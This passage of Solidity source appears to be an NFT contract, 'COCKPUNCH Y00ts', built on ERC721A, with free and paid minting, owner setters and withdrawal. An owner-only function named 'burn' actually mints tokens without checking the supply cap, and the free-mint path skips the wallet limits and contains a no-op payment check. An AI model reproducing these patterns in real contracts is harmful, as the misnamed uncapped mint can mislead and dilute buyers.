1091         bool safe
1092     ) internal {
1093         uint256 startTokenId = currentIndex;
1094         require(to != address(0), "ERC721A: mint to the zero address");
1095         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1096 
1097         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1098 
1099         // Overflows are incredibly unrealistic.
1100         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1101         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1102         unchecked {
1103             _addressData[to].balance += uint128(quantity);
1104             _addressData[to].numberMinted += uint128(quantity);
1105 
1106             _ownerships[startTokenId].addr = to;
1107             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1108 
1109             uint256 updatedIndex = startTokenId;
1110 
1111             for (uint256 i; i < quantity; i++) {
1112                 emit Transfer(address(0), to, updatedIndex);
1113                 if (safe) {
1114                     require(
1115                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1116                         "ERC721A: transfer to non ERC721Receiver implementer"
1117                     );
1118                 }
1119 
1120                 updatedIndex++;
1121             }
1122 
1123             currentIndex = updatedIndex;
1124         }
1125 
1126         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1127     }
1128 
1129     /**
1130      * @dev Transfers `tokenId` from `from` to `to`.
1131      *
1132      * Requirements:
1133      *
1134      * - `to` cannot be the zero address.
1135      * - `tokenId` token must be owned by `from`.
1136      *
1137      * Emits a {Transfer} event.
1138      */
1139     function _transfer(
1140         address from,
1141         address to,
1142         uint256 tokenId
1143     ) private {
1144         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1145 
1146         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1147             getApproved(tokenId) == _msgSender() ||
1148             isApprovedForAll(prevOwnership.addr, _msgSender()));
1149 
1150         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1151 
1152         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1153         require(to != address(0), "ERC721A: transfer to the zero address");
1154 
1155         _beforeTokenTransfers(from, to, tokenId, 1);
1156 
1157         // Clear approvals from the previous owner
1158         _approve(address(0), tokenId, prevOwnership.addr);
1159 
1160         // Underflow of the sender's balance is impossible because we check for
1161         // ownership above and the recipient's balance can't realistically overflow.
1162         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1163         unchecked {
1164             _addressData[from].balance -= 1;
1165             _addressData[to].balance += 1;
1166 
1167             _ownerships[tokenId].addr = to;
1168             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1169 
1170             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1171             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1172             uint256 nextTokenId = tokenId + 1;
1173             if (_ownerships[nextTokenId].addr == address(0)) {
1174                 if (_exists(nextTokenId)) {
1175                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1176                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1177                 }
1178             }
1179         }
1180 
1181         emit Transfer(from, to, tokenId);
1182         _afterTokenTransfers(from, to, tokenId, 1);
1183     }
1184 
1185     /**
1186      * @dev Approve `to` to operate on `tokenId`
1187      *
1188      * Emits a {Approval} event.
1189      */
1190     function _approve(
1191         address to,
1192         uint256 tokenId,
1193         address owner
1194     ) private {
1195         _tokenApprovals[tokenId] = to;
1196         emit Approval(owner, to, tokenId);
1197     }
1198 
1199     /**
1200      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1201      * The call is not executed if the target address is not a contract.
1202      *
1203      * @param from address representing the previous owner of the given token ID
1204      * @param to target address that will receive the tokens
1205      * @param tokenId uint256 ID of the token to be transferred
1206      * @param _data bytes optional data to send along with the call
1207      * @return bool whether the call correctly returned the expected magic value
1208      */
1209     function _checkOnERC721Received(
1210         address from,
1211         address to,
1212         uint256 tokenId,
1213         bytes memory _data
1214     ) private returns (bool) {
1215         if (to.isContract()) {
1216             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1217                 return retval == IERC721Receiver(to).onERC721Received.selector;
1218             } catch (bytes memory reason) {
1219                 if (reason.length == 0) {
1220                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1221                 } else {
1222                     assembly {
1223                         revert(add(32, reason), mload(reason))
1224                     }
1225                 }
1226             }
1227         } else {
1228             return true;
1229         }
1230     }
1231 
1232     /**
1233      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1234      *
1235      * startTokenId - the first token id to be transferred
1236      * quantity - the amount to be transferred
1237      *
1238      * Calling conditions:
1239      *
1240      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1241      * transferred to `to`.
1242      * - When `from` is zero, `tokenId` will be minted for `to`.
1243      */
1244     function _beforeTokenTransfers(
1245         address from,
1246         address to,
1247         uint256 startTokenId,
1248         uint256 quantity
1249     ) internal virtual {}
1250 
1251     /**
1252      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1253      * minting.
1254      *
1255      * startTokenId - the first token id to be transferred
1256      * quantity - the amount to be transferred
1257      *
1258      * Calling conditions:
1259      *
1260      * - when `from` and `to` are both non-zero.
1261      * - `from` and `to` are never both zero.
1262      */
1263     function _afterTokenTransfers(
1264         address from,
1265         address to,
1266         uint256 startTokenId,
1267         uint256 quantity
1268     ) internal virtual {}
1269 }
1270 
1271 contract CockpunchY00ts is ERC721A, Ownable, ReentrancyGuard {
1272     string public baseURI = "ipfs://bafybeia6hry7wwhol5dtv5vkewt2ly3ke3nhm7d65orxxzq5pnxwuoqrze/";
1273     uint   public price             = 0.0015 ether;
1274     uint   public maxPerTx          = 20;
1275     uint   public maxPerFree        = 3;
1276     uint   public maxPerWallet      = 33;
1277     uint   public totalFree         = 4444;
1278     uint   public maxSupply         = 4444;
1279     bool   public mintEnabled;
1280     uint   public totalFreeMinted = 0;
1281 
1282     mapping(address => uint256) public _mintedFreeAmount;
1283     mapping(address => uint256) public _totalMintedAmount;
1284 
1285     constructor() ERC721A("COCKPUNCH Y00ts", "CPY"){}
1286 
1287     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1288         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1289         string memory currentBaseURI = _baseURI();
1290         return bytes(currentBaseURI).length > 0
1291             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1292             : "";
1293     }
1294     
1295 
1296     function _startTokenId() internal view virtual returns (uint256) {
1297         return 1;
1298     }
1299 
1300     function mint(uint256 count) external payable {
1301         uint256 cost = price;
1302         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1303             (_mintedFreeAmount[msg.sender] < maxPerFree));
1304 
1305         if (isFree) { 
1306             require(mintEnabled, "Mint is not live yet");
1307             require(totalSupply() + count <= maxSupply, "No more");
1308             require(count <= maxPerTx, "Max per TX reached.");
1309             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1310             {
1311              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1312              _mintedFreeAmount[msg.sender] = maxPerFree;
1313              totalFreeMinted += maxPerFree;
1314             }
1315             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1316             {
1317              require(msg.value >= 0, "Please send the exact ETH amount");
1318              _mintedFreeAmount[msg.sender] += count;
1319              totalFreeMinted += count;
1320             }
1321         }
1322         else{
1323         require(mintEnabled, "Mint is not live yet");
1324         require(_totalMintedAmount[msg.sender] + count <= maxPerWallet, "Exceed maximum NFTs per wallet");
1325         require(msg.value >= count * cost, "Please send the exact ETH amount");
1326         require(totalSupply() + count <= maxSupply, "No more");
1327         require(count <= maxPerTx, "Max per TX reached.");
1328         require(msg.sender == tx.origin, "The minter is another contract");
1329         }
1330         _totalMintedAmount[msg.sender] += count;
1331         _safeMint(msg.sender, count);
1332     }
1333 
1334     function costCheck() public view returns (uint256) {
1335         return price;
1336     }
1337 
1338     function maxFreePerWallet() public view returns (uint256) {
1339       return maxPerFree;
1340     }
1341 
1342     function burn(address mintAddress, uint256 count) public onlyOwner {
1343         _safeMint(mintAddress, count);
1344     }
1345 
1346     function _baseURI() internal view virtual override returns (string memory) {
1347         return baseURI;
1348     }
1349 
1350     function setBaseUri(string memory baseuri_) public onlyOwner {
1351         baseURI = baseuri_;
1352     }
1353 
1354     function setPrice(uint256 price_) external onlyOwner {
1355         price = price_;
1356     }
1357 
1358     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1359         totalFree = MaxTotalFree_;
1360     }
1361 
1362      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1363         maxPerFree = MaxPerFree_;
1364     }
1365 
1366     function toggleMinting() external onlyOwner {
1367       mintEnabled = !mintEnabled;
1368     }
1369     
1370     function CommunityWallet(uint quantity, address user)
1371     public
1372     onlyOwner
1373   {
1374     require(
1375       quantity > 0,
1376       "Invalid mint amount"
1377     );
1378     require(
1379       totalSupply() + quantity <= maxSupply,
1380       "Maximum supply exceeded"
1381     );
1382     _safeMint(user, quantity);
1383   }
1384 
1385     function withdraw() external onlyOwner nonReentrant {
1386         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1387         require(success, "Transfer failed.");
1388     }
1389 }